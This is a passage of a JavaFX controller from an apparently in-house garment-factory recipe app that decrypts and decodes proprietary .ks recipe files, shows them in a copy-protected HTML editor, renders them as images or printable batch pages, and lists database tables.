        alol.setResizable(true);
        alol.showAndWait();
    Thread.sleep(500);
    tw2o.delete(); 
      }    
    }    
    }
    
    
    
    
    
  @FXML
    void imageaction(MouseEvent event) throws InterruptedException, IOException, ParserConfigurationException, SAXException {
 String ksFilePath=link.getText();
         if (!ksFilePath.endsWith(".ks")) {
            showNotification("Error", "I can't find the recipe, please choose one first.");
            return;
        }
        String pathy = ksFilePath.replace("\\", "\\\\")
                .replace("Z:", letterr + ":")
                .replace("X:", letterr + ":")
                .replace("V:", letterr + ":")
                .replace("W:", letterr + ":");
        File ksFile = new File(pathy);
        if (!ksFile.exists()) {
            showNotification("Error", "I can't find the recipe, maybe KADINIO has deleted or encrypted it.");
            return;
        }
        // Read .ks file content and do your replacements to get HTML
        StringBuilder coodeText = new StringBuilder();
        try (BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(ksFile), StandardCharsets.UTF_8))) {
            String line;
            while ((line = br.readLine()) != null) {
                coodeText.append("\n").append(
                    line.replace("ﬦ", "A").replace("ﬧ", "B").replace("ﬨ", "C").replace("﬩", "D")
                        .replace("שׁ", "E").replace("שׂ", "F").replace("שּׁ", "G").replace("שּׂ", "H")
                        .replace("אַ", "I").replace("אָ", "J").replace("אּ", "K").replace("בּ", "L")
                        .replace("גּ", "M").replace("דּ", "N").replace("הּ", "O").replace("וּ", "P")
                        .replace("זּ", "Q").replace("טּ", "R").replace("יּ", "S").replace("ךּ", "T")
                        .replace("כּ", "U").replace("לּ", "V").replace("מּ", "W").replace("נּ", "X")
                        .replace("סּ", "Y").replace("ףּ", "Z").replace("פּ", "0").replace("צּ", "1")
                        .replace("קּ", "2").replace("רּ", "3").replace("שּ", "4").replace("תּ", "5")
                        .replace("וֹ", "6").replace("בֿ", "7").replace("כֿ", "8").replace("פֿ", "9")
                        .replace("&NBSP;", "")
                );
            }
        } catch (Exception e) {
            showNotification("Error", "Failed to read recipe file.");
            e.printStackTrace();
            return;
        }
        String htmlContent = coodeText.toString();
        // Choose directory to save the image
        DirectoryChooser directoryChooser = new DirectoryChooser();
        directoryChooser.setTitle("Choose folder to save the recipe image");
        File selectedDir = directoryChooser.showDialog(null);
        if (selectedDir == null) {
            // User cancelled
            return;
        }
    String html = htmlContent;  // replace with your htmlContent
    int width = 5000, height = 3000;
    BufferedImage image = GraphicsEnvironment.getLocalGraphicsEnvironment()
    .getDefaultScreenDevice().getDefaultConfiguration()
    .createCompatibleImage(width, height);
    Graphics graphics = image.createGraphics();
    JEditorPane jep = new JEditorPane("text/html", html);
    jep.setSize(width, height);
    jep.print(graphics);
    String baseFileName = new File(ksFilePath).getName().replace(".ks", "");
    File imageFile = new File(selectedDir, baseFileName + ".png");
    ImageIO.write(image, "png", imageFile);
    Desktop nsdf=Desktop.getDesktop();
    nsdf.open(imageFile);   
    }
  
  
  
    
    
 private void showNotification(String title, String message) {
        Platform.runLater(() -> {
            Image img = new Image(getClass().getResourceAsStream("kadysoft.png"));
            ImageView imgview = new ImageView(img);
            Notifications noti = Notifications.create()
                    .title(title)
                    .text(message)
                    .graphic(imgview)
                    .position(Pos.CENTER)
                    .hideAfter(Duration.seconds(3));
            noti.show();
        });
 }
 
 


 
  @FXML
  void printicaction(ActionEvent event) throws IOException, InterruptedException, Exception {                    
      String pathy = link.getText().replace("\\","\\\\").replace("Z:",letterr+":").replace("X:",letterr+":").replace("V:",letterr+":").replace("W:",letterr+":");
      File op = new File(pathy);
      if (!pathy.contains(".ks")||!pathy.contains(".ks")) { 
          //Noti
      Notifications noti = Notifications.create();
      noti.title("Error");
      noti.text("Please Choose One Recipe First.");
      noti.position(Pos.CENTER);
      noti.hideAfter(Duration.seconds(3));
      noti.showError();
      }
      else {  
          
          
    ////////////////////////////////////////////////////////////

    String longKey;
    try (BufferedReader cxsd = new BufferedReader(new FileReader("lib\\java.dat"))) {
        longKey = cxsd.readLine();
    }
    if (longKey == null || longKey.trim().isEmpty()) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("java.dat is empty!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String result = KeyDecoder.extractData(longKey.trim());
    if (op == null) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("Choose file first!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String input = op.getAbsolutePath();
    String nameofit=op.getName();
    String tempOutput = System.getProperty("user.home")+"\\"+nameofit;
    FileDecryptor.decrypt(input, tempOutput, result);
    File temp = new File(tempOutput);
    ////////////////////////////////////////////////////////////
          
          
          
    InputStream inputinstream=new FileInputStream(temp);
    BufferedReader bi=new BufferedReader (new InputStreamReader (inputinstream,"UTF-8"));
    OutputStream instreamm=new FileOutputStream(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Main_Editor"));
    PrintWriter pwe = new PrintWriter(new OutputStreamWriter (instreamm,"UTF-8"));
    pwe.append("<html lang=\"ar\">\n<head><title>Kadysoft Ltd - Ahmed Elkady.</title>"
            + ""
            + "<style>\n" +
"        body {\n" +
"            user-select: none;\n" +
"            -webkit-user-select: none;\n" +
"            -moz-user-select: none;\n" +
"            -ms-user-select: none;\n" +
"        }\n" +
"    </style>"
          +"<script>\n" +
"        document.addEventListener('dragstart', function(event) {\n" +
"            event.preventDefault();\n" +
"        });\n" +
"\n" +
"        document.addEventListener('drop', function(event) {\n" +
"            event.preventDefault();\n" +
"        });\n" +
"\n" +
"        document.addEventListener('contextmenu', function(event) {\n" +
"            event.preventDefault();\n" +
"        });\n" +
"    </script>"  
            + "<script>\n" +
"  \n" +
"  window.addEventListener(`contextmenu`, (e) => {\n" +
"    e.preventDefault();\n" +
"});\n" +
"  \n" +
"  </script>"
            + ""
            + "\n<meta charset=\"UTF-8\"/>\n<meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\"/>\n\t\t<meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" />"
            + ""
            + "<script>\n" +
"            \n" +
"            document.addEventListener('keydown', event => {\n" +
"  console.log(`User pressed: ${event.key}`);\n" +
"  event.preventDefault();\n" +
"  return false;\n" +
"});\n" +
"            \n" +
"            </script>"
         +"<script>\n" +
"        document.addEventListener('keydown', function (event) {\n" +
"            // Disable specific keys or key combinations\n" +
"            event.preventDefault();\n" +
"        });\n" +
"    </script>"   
            + ""
            + "\n\t\t<title></title>\n\t\t<link rel=\"stylesheet\" href=\"./app.css\" />\n\t\t<link rel=\"stylesheet\" href=\"./build/jodit.min.css\" />\n\t\t<script src=\"./build/jodit.js\"></script>\n\t</head>\n\t<body>\n\t\t<style>\n\t\t\t#box {\n\t\t\t\tpadding: 100px;\n\t\t\t\tmargin: 20px;\n\t\t\t\tposition: relative;\n\t\t\t\theight: 500px;\n\t\t\t}\n\n\t\t\t@media (max-width: 480px) {\n\t\t\t\t#box {\n\t\t\t\t\tpadding: 0;\n\t\t\t\t}\n\t\t\t}\n\t\t</style>\n\t\t<div id=\"box\">\n\t\t\t<textarea id=\"editor\">\n\n\n\n\n");
    String line;
    while ((line = bi.readLine()) != null)  
    pwe.append(line  
       .replace("ﬦ","A")
       .replace("ﬧ","B")
       .replace("ﬨ","C")
       .replace("﬩","D")
       .replace("שׁ","E")    
       .replace("שׂ","F")        
       .replace("שּׁ","G")         
       .replace("שּׂ","H")         
       .replace("אַ","I")         
       .replace("אָ","J")         
       .replace("אּ","K")         
       .replace("בּ","L")         
       .replace("גּ","M")         
       .replace("דּ","N")         
       .replace("הּ","O")         
       .replace("וּ","P")         
       .replace("זּ","Q")         
       .replace("טּ","R")         
       .replace("יּ","S")         
       .replace("ךּ","T")         
       .replace("כּ","U")         
       .replace("לּ","V")
       .replace("מּ","W")         
       .replace("נּ","X")         
       .replace("סּ","Y")         
       .replace("ףּ","Z")         
       .replace("פּ","0")         
       .replace("צּ","1")         
       .replace("קּ","2")         
       .replace("רּ","3")         
       .replace("שּ","4")         
       .replace("תּ","5")         
       .replace("וֹ","6")         
       .replace("בֿ","7")         
       .replace("כֿ","8")
       .replace("פֿ","9")
       .replace("&NBSP;","")
            + "\n");   
    pwe.append("\n\n\n</textarea>\n\t\t</div>\n\t\t<script>\n\t\t\tconst editor = Jodit.make('#editor' ,{\n\t\t\t\tuploader: {\n\t\t\t\t\t\n\t\t\t\t},\n\t\t\t\tfilebrowser: {\n\t\t\t\t\tajax: {\n\t\t\t\t\t\t\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t});\n\t\t</script>\n\t</body>\n</html>"); 
    pwe.close();
    bi.close();
    
    ////////////////////////////////////////////////////////////////
    if (temp.exists()) {
        temp.delete();
    }
    ////////////////////////////////////////////////////////////////
    
    
    Desktop desk = Desktop.getDesktop();
    desk.open(new File(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Main_Editor"))); 
    Thread.sleep(4000);
    File ggf=new File (getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Main_Editor"));
    PrintWriter pl=new PrintWriter(new FileWriter(ggf));
    pl.println("Powered By Kadysoft");
    pl.close();   
      }
  }
  
  
  
  
  
  @FXML
  void seepilotaction(ActionEvent event) throws IOException {  
   DirectoryViewer hhii=new DirectoryViewer ();
   hhii.start(new Stage());
  }
  
  
  
  
  
  private void generateFinalHtml(String bodyContent, String headerText, int fromPage, int toPage,
                               String lotnumber, String entertime, String exittimee) {
    try {
        StringBuilder html = new StringBuilder();
        html.append("<html><head><style>")
            .append("@media print {")
            .append("  body { margin: 0; }")
            .append("  .page { page-break-after: always; break-after: page; }")
            .append("}")
            .append("body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #fafafa; }")
            .append(".page { width: 210mm; height: 297mm; padding: 20mm; box-sizing: border-box; }")
            // تصميم كارد حديث أبيض وأسود
            .append(".header-box {")
            .append("  background: #ffffff;")
            .append("  border: 1.5px solid #333;")
            .append("  padding: 18px;")
            .append("  border-radius: 10px;")
            .append("  margin-bottom: 25px;")
            .append("  display: flex; flex-wrap: wrap; gap: 12px;")
            .append("  box-shadow: 0 2px 6px rgba(0,0,0,0.15);")
            .append("}")
            .append(".info-item {")
            .append("  background: #f2f2f2;")
            .append("  padding: 10px 16px;")
            .append("  border-radius: 6px;")
            .append("  font-size: 14px;")
            .append("  font-weight: bold;")
            .append("  color: #000;")
            .append("  border: 1px solid #ccc;")
            .append("}")
            .append("</style></head>")
            // منع التعديل والـ contextmenu
            .append("<body oncontextmenu='return false;' contenteditable='false'>");
        for (int i = fromPage; i <= toPage; i++) {
            html.append("<div class='page'>")
                .append("<div class='header-box'>")
                .append("<div class='info-item'>Patch NO: ").append(i).append("</div>")
                .append("<div class='info-item'>Entry Time: ").append(entertime).append("</div>")
                .append("<div class='info-item'>Exit Time: ").append(exittimee).append("</div>")
                .append("<div class='info-item'>LOT Number: ").append(lotnumber).append("</div>")
                .append("</div>")
                .append(bodyContent)
                .append("</div>");
        }
        html.append("</body></html>");
        File file = File.createTempFile("html_print_pages_", ".html");
try (Writer writer = new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8)) {
    writer.write(html.toString());
}
        String chromePath = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"; 
        new ProcessBuilder(chromePath, file.getAbsolutePath()).start();
    } catch (IOException e) {
        showAlert("Error", "Failed to generate or open the HTML file.");
        e.printStackTrace();
    }
}

  
  
  
  
  private String readFile(File file) throws IOException, Exception {
      
          ////////////////////////////////////////////////////////////

    String longKey;
    try (BufferedReader cxsd = new BufferedReader(new FileReader("lib\\java.dat"))) {
        longKey = cxsd.readLine();
    }
    if (longKey == null || longKey.trim().isEmpty()) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("java.dat is empty!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        //return;
    }
    String result = KeyDecoder.extractData(longKey.trim());
    if (file == null) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("Choose file first!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        //return;
    }
    String input = file.getAbsolutePath();
    String nameofit=file.getName();
    String tempOutput = System.getProperty("user.home")+"\\"+nameofit;
 
    FileDecryptor.decrypt(input, tempOutput, result);
    File temp = new File(tempOutput);
    
    ////////////////////////////////////////////////////////////
      
      
        InputStream inputinstream=new FileInputStream(temp);
        BufferedReader reader=new BufferedReader (new InputStreamReader (inputinstream,"UTF-8"));
        StringBuilder content = new StringBuilder();
        String line;
        while((line = reader.readLine()) != null){
        content.append(line.replace("ﬦ","A")
       .replace("ﬧ","B")
       .replace("ﬨ","C")
       .replace("﬩","D")
       .replace("שׁ","E")    
       .replace("שׂ","F")        
       .replace("שּׁ","G")         
       .replace("שּׂ","H")         
       .replace("אַ","I")         
       .replace("אָ","J")         
       .replace("אּ","K")         
       .replace("בּ","L")         
       .replace("גּ","M")         
       .replace("דּ","N")         
       .replace("הּ","O")         
       .replace("וּ","P")         
       .replace("זּ","Q")         
       .replace("טּ","R")         
       .replace("יּ","S")         
       .replace("ךּ","T")         
       .replace("כּ","U")         
       .replace("לּ","V")
       .replace("מּ","W")         
       .replace("נּ","X")         
       .replace("סּ","Y")         
       .replace("ףּ","Z")         
       .replace("פּ","0")         
       .replace("צּ","1")         
       .replace("קּ","2")         
       .replace("רּ","3")         
       .replace("שּ","4")         
       .replace("תּ","5")         
       .replace("וֹ","6")         
       .replace("בֿ","7")         
       .replace("כֿ","8")
       .replace("פֿ","9")
       .replace("&NBSP;","")).append("\n");
        }
        reader.close();
        return content.toString();
    }
    private void showAlert(String title, String message){
        Alert alert = new Alert(Alert.AlertType.INFORMATION);
        alert.setTitle(title);
        alert.setHeaderText(null);
        alert.setContentText(message);
        alert.showAndWait();
    }
  
  
  
  
    
  private TextField styledField(String prompt) {
    TextField tf = new TextField();
    tf.setPromptText(prompt);
    tf.setStyle(fieldStyle());
    return tf;
}

  
  
  
  
private String fieldStyle() {
    return
            "-fx-background-radius:12;" +
            "-fx-border-radius:12;" +
            "-fx-background-color:#f9fbfd;" +
            "-fx-border-color:#dcdfe6;" +
            "-fx-text-fill:#2c3e50;" +
            "-fx-font-size:13px;" +
            "-fx-padding:10 14;";
}





private Label styledLabel(String text) {
    Label lbl = new Label(text);
    lbl.setStyle(
            "-fx-font-size:14px;" +
            "-fx-font-weight:600;" +
            "-fx-text-fill:#34495e;"
    );
    return lbl;
}

  



  @FXML
    void editorprintaction(ActionEvent event) throws FileNotFoundException, IOException, InterruptedException, Exception {
        if (audit.isSelected()==true) {   
            //Audit
            File selectedHtmlFile;
            FileChooser fileChooser = new FileChooser();
        String go = getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Recipes")+"\\PRODUCTION";
        fileChooser.setInitialDirectory(new File(go));
            fileChooser.setTitle("Select Kadysoft File");
            fileChooser.getExtensionFilters().add(
            new FileChooser.ExtensionFilter("KADYSOFT Files", "*.ks")
            );
            fileChooser.getExtensionFilters().add(new FileChooser.ExtensionFilter("HTML Files", new String[] { "*.html" }));
            File file = fileChooser.showOpenDialog(null);
 if (file != null) {
    selectedHtmlFile = file;
    final Dialog<ButtonType> dialog = new Dialog<>();
    dialog.setTitle("Info & Range");
    dialog.setResizable(false);
    // ================== Title ==================
    Label title = new Label("إدخال بيانات التشغيل");
    title.setStyle(
        "-fx-font-size: 24px; " +
        "-fx-font-weight: bold; " +
        "-fx-text-fill: #1e40af; " +
        "-fx-alignment: center;"
    );
    // ================== Header ==================
    TextField headerField = new TextField("كل حاجة تمت بحب بواسطة كادي سوفت");
    headerField.setDisable(true);
    headerField.setStyle(
        "-fx-background-color: #f1f5f9; " +
        "-fx-text-fill: #475569; " +
        "-fx-background-radius: 10; " +
        "-fx-border-radius: 10; " +
        "-fx-border-color: #e2e8f0; " +
        "-fx-border-width: 2; " +
        "-fx-padding: 10 14; " +
        "-fx-font-size: 15px;"
    );
    // ================== Time ==================
    DateTimeFormatter dtf = DateTimeFormatter.ofPattern("hh:mm:ss a");
    ZonedDateTime now = ZonedDateTime.now(ZoneOffset.ofHours(3));
    TextField enterTime = new TextField(dtf.format(now));
    enterTime.setPromptText("وقت الدخول");
    enterTime.setStyle(
        "-fx-background-color: #f8fafc; " +
        "-fx-background-radius: 10; " +
        "-fx-border-radius: 10; " +
        "-fx-border-color: #cbd5e1; " +
        "-fx-border-width: 2; " +
        "-fx-padding: 10 14; " +
        "-fx-font-size: 15px;"
    );
    TextField exitTime = new TextField("04:00:00 PM");
    exitTime.setPromptText("وقت الخروج");
    exitTime.setStyle(enterTime.getStyle());
    // ================== Range ==================
    TextField fromField = new TextField();
    fromField.setPromptText("من");
    fromField.setStyle(enterTime.getStyle());
    TextField toField = new TextField();
    toField.setPromptText("إلى");
    toField.setStyle(enterTime.getStyle());
    TextField lotNum = new TextField();
    lotNum.setPromptText("رقم اللوت");
    lotNum.setStyle(enterTime.getStyle());
    // ================== Labels ==================
    String labelStyle =
        "-fx-font-size: 15px; " +
        "-fx-font-weight: 600; " +
        "-fx-text-fill: #334155;";
    // ================== Layout ==================
    GridPane grid = new GridPane();
    grid.setHgap(20);
    grid.setVgap(18);
    grid.setStyle("-fx-padding: 10;");
    Label lblHeader = new Label("العنوان");
    lblHeader.setStyle(labelStyle);
    grid.add(lblHeader, 0, 0);
    grid.add(headerField, 1, 0, 3, 1);
    Label lblRange = new Label("رينج المكن");
    lblRange.setStyle(labelStyle);
    grid.add(lblRange, 0, 1);
    grid.add(fromField, 1, 1);
    grid.add(toField, 2, 1);
    grid.add(lotNum, 3, 1);
    Label lblTime = new Label("الوقت");
    lblTime.setStyle(labelStyle);
    grid.add(lblTime, 0, 2);
    grid.add(enterTime, 1, 2);
    grid.add(exitTime, 2, 2);
    VBox root = new VBox(30, title, grid);
    root.setStyle(
        "-fx-padding: 35; " +
        "-fx-background-color: white; " +
        "-fx-background-radius: 16; " +
        "-fx-effect: dropshadow(gaussian, rgba(0,0,0,0.25), 30, 0, 0, 12);"
    );
    // ================== Custom Buttons ==================
    javafx.scene.control.Button okButton = new javafx.scene.control.Button("تأكيد");
    okButton.setDefaultButton(true);
    okButton.setStyle(
        "-fx-background-color: linear-gradient(to bottom, #3b82f6, #2563eb); " +
        "-fx-text-fill: white; " +
        "-fx-font-size: 15px; " +
        "-fx-font-weight: bold; " +
        "-fx-padding: 10 28; " +
        "-fx-background-radius: 12; " +
        "-fx-border-radius: 12; " +
        "-fx-cursor: hand; " +
        "-fx-effect: dropshadow(gaussian, rgba(59,130,246,0.4), 12, 0, 0, 4);"
    );
    javafx.scene.control.Button cancelButton = new javafx.scene.control.Button("إلغاء");
    cancelButton.setCancelButton(true);
    cancelButton.setStyle(
        "-fx-background-color: #6b7280; " +
        "-fx-text-fill: white; " +
        "-fx-font-size: 15px; " +
        "-fx-font-weight: bold; " +
        "-fx-padding: 10 28; " +
        "-fx-background-radius: 12; " +
        "-fx-border-radius: 12; " +
        "-fx-cursor: hand;"
    );
    HBox buttonBar = new HBox(15, okButton, cancelButton);
    buttonBar.setAlignment(Pos.CENTER_RIGHT);
    buttonBar.setPadding(new Insets(15, 20, 15, 20));
    buttonBar.setStyle("-fx-background-color: #f8fafc; -fx-background-radius: 0 0 16 16;");
    // ================== Final Content ==================
    VBox dialogContent = new VBox(root, buttonBar);
    dialogContent.setStyle("-fx-background-color: transparent;");
    dialog.getDialogPane().setContent(dialogContent);
    dialog.getDialogPane().setStyle("-fx-background-color: transparent;");
    // ================== Button Actions ==================
    okButton.setOnAction(eventr -> {
        if (fromField.getText().trim().isEmpty() ||
            toField.getText().trim().isEmpty() ||
            lotNum.getText().trim().isEmpty() ||
            enterTime.getText().trim().isEmpty() ||
            exitTime.getText().trim().isEmpty()) {
            showAlert("خطأ", "جميع الحقول مطلوبة");
            return;
        }
        try {
            int from = Integer.parseInt(fromField.getText().trim());
            int to = Integer.parseInt(toField.getText().trim());
            if (from < 1 || from > to) {
                showAlert("خطأ", "نطاق غير صحيح (من يجب أن يكون أقل من أو يساوي إلى)");
                return;
            }
            String content = readFile(selectedHtmlFile);
            generateFinalHtml(
                content,
                headerField.getText(),
                from,
                to,
                lotNum.getText().trim(),
                enterTime.getText().trim(),
                exitTime.getText().trim()
            );
            dialog.setResult(ButtonType.OK);
            dialog.close();
        } catch (NumberFormatException ex) {
            showAlert("خطأ", "الرجاء إدخال أرقام صحيحة في حقول الرينج");
        } catch (Exception ex) {
            showAlert("خطأ", "حدث خطأ أثناء المعالجة");
            ex.printStackTrace();
        }
    });
    cancelButton.setOnAction(eventg -> {
        dialog.setResult(ButtonType.CANCEL);
        dialog.close();
    });
    dialog.showAndWait();
}       
        }
        else { 
           //Normal       
    FileChooser fcho = new FileChooser();
    String go = getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Recipes")+"\\PRODUCTION";
    fcho.setInitialDirectory(new File(go));
    fcho.getExtensionFilters().add(new FileChooser.ExtensionFilter("Kadysoft Files", new String[] { "*.ks" }));
    fcho.getExtensionFilters().add(new FileChooser.ExtensionFilter("HTML Files", new String[] { "*.html" }));
    fcho.setTitle("Kady Choose");
    File f = fcho.showOpenDialog((Window)null);
    String pathy = f.getAbsolutePath().toString();
    
    
        ////////////////////////////////////////////////////////////

    String longKey;
    try (BufferedReader cxsd = new BufferedReader(new FileReader("lib\\java.dat"))) {
        longKey = cxsd.readLine();
    }
    if (longKey == null || longKey.trim().isEmpty()) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("java.dat is empty!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String result = KeyDecoder.extractData(longKey.trim());
    if (f == null) {
        Notifications noti = Notifications.create();
        noti.title("Fatal Error!");
        noti.text("Choose file first!");
        noti.position(Pos.CENTER);
        noti.hideAfter(Duration.seconds(4));
        noti.showError();
        return;
    }
    String input = f.getAbsolutePath();
    String nameofit=f.getName();
    String tempOutput = System.getProperty("user.home")+"\\"+nameofit;
 
    FileDecryptor.decrypt(input, tempOutput, result);
    File temp = new File(tempOutput);
    
    ////////////////////////////////////////////////////////////
    
    InputStream inputinstream=new FileInputStream(temp);
    BufferedReader bi=new BufferedReader (new InputStreamReader (inputinstream,"UTF-8"));
    OutputStream instreamm=new FileOutputStream(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Main_Editor"));
    PrintWriter pwe = new PrintWriter(new OutputStreamWriter (instreamm,"UTF-8"));
    pwe.append("<html lang=\"ar\">\n<head><title>Kadysoft Ltd - Ahmed Elkady.</title>"
            + ""
            + "<style>\n" +
"        body {\n" +
"            user-select: none;\n" +
"            -webkit-user-select: none;\n" +
"            -moz-user-select: none;\n" +
"            -ms-user-select: none;\n" +
"        }\n" +
"    </style>"
          +"<script>\n" +
"        document.addEventListener('dragstart', function(event) {\n" +
"            event.preventDefault();\n" +
"        });\n" +
"\n" +
"        document.addEventListener('drop', function(event) {\n" +
"            event.preventDefault();\n" +
"        });\n" +
"\n" +
"        document.addEventListener('contextmenu', function(event) {\n" +
"            event.preventDefault();\n" +
"        });\n" +
"    </script>"  
            
            + "<script>\n" +
"  \n" +
"  window.addEventListener(`contextmenu`, (e) => {\n" +
"    e.preventDefault();\n" +
"});\n" +
"  \n" +
"  </script>"
             + ""
            + "\n<meta charset=\"UTF-8\"/>\n<meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\"/>\n\t\t<meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" />"
            + ""
            + "<script>\n" +
"            \n" +
"            document.addEventListener('keydown', event => {\n" +
"  console.log(`User pressed: ${event.key}`);\n" +
"  event.preventDefault();\n" +
"  return false;\n" +
"});\n" +
"            \n" +
"            </script>"
            
       +"<script>\n" +
"        document.addEventListener('keydown', function (event) {\n" +
"            // Disable specific keys or key combinations\n" +
"            event.preventDefault();\n" +
"        });\n" +
"    </script>"     
            + ""
            + "\n\t\t<title></title>\n\t\t<link rel=\"stylesheet\" href=\"./app.css\" />\n\t\t<link rel=\"stylesheet\" href=\"./build/jodit.min.css\" />\n\t\t<script src=\"./build/jodit.js\"></script>\n\t</head>\n\t<body>\n\t\t<style>\n\t\t\t#box {\n\t\t\t\tpadding: 100px;\n\t\t\t\tmargin: 20px;\n\t\t\t\tposition: relative;\n\t\t\t\theight: 500px;\n\t\t\t}\n\n\t\t\t@media (max-width: 480px) {\n\t\t\t\t#box {\n\t\t\t\t\tpadding: 0;\n\t\t\t\t}\n\t\t\t}\n\t\t</style>\n\t\t<div id=\"box\">\n\t\t\t<textarea id=\"editor\">\n\n\n\n\n");
    String line;
    while ((line = bi.readLine()) != null)  
    pwe.append(line 
       .replace("ﬦ","A")
       .replace("ﬧ","B")
       .replace("ﬨ","C")
       .replace("﬩","D")
       .replace("שׁ","E")    
       .replace("שׂ","F")        
       .replace("שּׁ","G")         
       .replace("שּׂ","H")         
       .replace("אַ","I")         
       .replace("אָ","J")         
       .replace("אּ","K")         
       .replace("בּ","L")         
       .replace("גּ","M")         
       .replace("דּ","N")         
       .replace("הּ","O")         
       .replace("וּ","P")         
       .replace("זּ","Q")         
       .replace("טּ","R")         
       .replace("יּ","S")         
       .replace("ךּ","T")         
       .replace("כּ","U")         
       .replace("לּ","V")
       .replace("מּ","W")         
       .replace("נּ","X")         
       .replace("סּ","Y")         
       .replace("ףּ","Z")         
       .replace("פּ","0")         
       .replace("צּ","1")         
       .replace("קּ","2")         
       .replace("רּ","3")         
       .replace("שּ","4")         
       .replace("תּ","5")         
       .replace("וֹ","6")         
       .replace("בֿ","7")         
       .replace("כֿ","8")
       .replace("פֿ","9")
       .replace("&NBSP;","")    
            + "\n");   
    pwe.append("\n\n\n</textarea>\n\t\t</div>\n\t\t<script>\n\t\t\tconst editor = Jodit.make('#editor' ,{\n\t\t\t\tuploader: {\n\t\t\t\t\t\n\t\t\t\t},\n\t\t\t\tfilebrowser: {\n\t\t\t\t\tajax: {\n\t\t\t\t\t\t\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t});\n\t\t</script>\n\t</body>\n</html>"); 
    pwe.close();
    bi.close();
    
    ////////////////////////////////////////////////////////////////
    if (temp.exists()) {
        temp.delete();
    }
    ////////////////////////////////////////////////////////////////
    
    Desktop desk = Desktop.getDesktop();
    desk.open(new File(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Main_Editor"))); 
    Thread.sleep(4000);
    File ggf=new File (getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Main_Editor"));
    PrintWriter pl=new PrintWriter(new FileWriter(ggf));
    pl.println("Powered By Kadysoft");
    pl.close();   
        }
    }
 
  
  
 
    
  @FXML
  void getall1action(ActionEvent event) {
    this.table.getColumns().clear();
    ObservableList<ObservableList> data = FXCollections.observableArrayList();
    try {
      String sql = "select * from Development";
      this.pst = this.conn.prepareStatement(sql);
      this.rs = this.pst.executeQuery();
      for (int i = 0; i < this.rs.getMetaData().getColumnCount(); i++) {
        final int j = i;
        TableColumn<Object, Object> col = new TableColumn<>(this.rs.getMetaData().getColumnName(i + 1));
        col.setCellValueFactory((Callback)new Callback<TableColumn.CellDataFeatures<ObservableList, String>, ObservableValue<String>>() {
              public ObservableValue<String> call(TableColumn.CellDataFeatures<ObservableList, String> param) {
                return new SimpleStringProperty(((ObservableList<String>)param.getValue()).get(j).toString());
              }
            });
        this.table.getColumns().addAll(new Object[] { col });
      } 
      while (this.rs.next()) {
        ObservableList<String> row = FXCollections.observableArrayList();
        for (int j = 1; j <= this.rs.getMetaData().getColumnCount(); j++)
          row.add(this.rs.getString(j)); 
        data.add(row);
      } 
      this.table.setItems(data);
    } catch (Exception e) {
      JOptionPane.showMessageDialog(null, e);
    } finally {
      try {
        this.rs.close();
        this.pst.close();
      } catch (Exception exception) {}
    }
    
      TableFilter filter = new TableFilter(table);
  }
  
  
  
  
  
  @FXML
  void getallaction(ActionEvent event) {
    this.table.getColumns().clear();
    ObservableList<ObservableList> data = FXCollections.observableArrayList();
    try {
      String sql = "select * from Creation";
      this.pst = this.conn.prepareStatement(sql);
      this.rs = this.pst.executeQuery();
      for (int i = 0; i < this.rs.getMetaData().getColumnCount(); i++) {
        final int j = i;
        TableColumn<Object, Object> col = new TableColumn<>(this.rs.getMetaData().getColumnName(i + 1));
        col.setCellValueFactory((Callback)new Callback<TableColumn.CellDataFeatures<ObservableList, String>, ObservableValue<String>>() {
              public ObservableValue<String> call(TableColumn.CellDataFeatures<ObservableList, String> param) {
                return new SimpleStringProperty(((ObservableList<String>)param.getValue()).get(j).toString());
              }
            });
        this.table.getColumns().addAll(new Object[] { col });
      } 
      while (this.rs.next()) {
        ObservableList<String> row = FXCollections.observableArrayList();
        for (int j = 1; j <= this.rs.getMetaData().getColumnCount(); j++)
          row.add(this.rs.getString(j)); 
        data.add(row);
      } 
      this.table.setItems(data);
    } catch (Exception e) {
      JOptionPane.showMessageDialog(null, e);
    } finally {
      try {
        this.rs.close();
        this.pst.close();
      } catch (Exception exception) {}
    }
    
      TableFilter filter = new TableFilter(table);
  }
  
  
  
  
  
  @FXML
  void linkaction(ActionEvent event) throws IOException, InterruptedException, Exception {
    String linkval = this.link.getText();
    if (linkval.equals("T & C Garments")) {
      Image img = new Image(getClass().getResourceAsStream("kadysoft.png"));
      ImageView imgview = new ImageView();
      imgview.setImage(img);
      Notifications noti = Notifications.create();
      noti.title("Error");
      noti.text("Hyperlink doesn't contain path to any Recipe.");
      noti.graphic(imgview);
      noti.position(Pos.CENTER);
      noti.show();
    } else if (!linkval.contains("Recipe_System\\Recipes")) {
